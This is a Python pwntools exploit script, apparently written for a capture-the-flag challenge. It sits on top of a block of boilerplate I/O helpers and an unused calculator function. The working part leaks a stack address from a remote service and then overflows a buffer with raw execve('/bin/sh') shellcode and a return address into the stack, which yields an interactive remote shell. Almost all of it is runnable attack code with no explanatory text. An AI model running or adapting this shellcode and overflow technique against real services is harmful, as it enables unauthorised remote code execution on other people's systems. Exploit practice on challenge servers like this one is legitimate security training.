import time
from pwn import *
from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 27014)
# io = remote("dasctf_sixbytes.node.game.sycsec.com", 30088)
# io = remote("node5.anna.nssctf.cn", 28604)
io = remote("112.6.51.212", 31155)


# io = process('./q2')

# gdb.attach(io)
# elf = ELF('./alloc')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

s(b'a'*0xf+b'b')
ru(b'ab')
stack=u64(ru(b'\x7f').ljust(8,b'\x00'))
print(hex(stack))
shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
sla(b'strong',shellcode.ljust(0x78,b'\x00')+p64(stack-0x80))

inter()
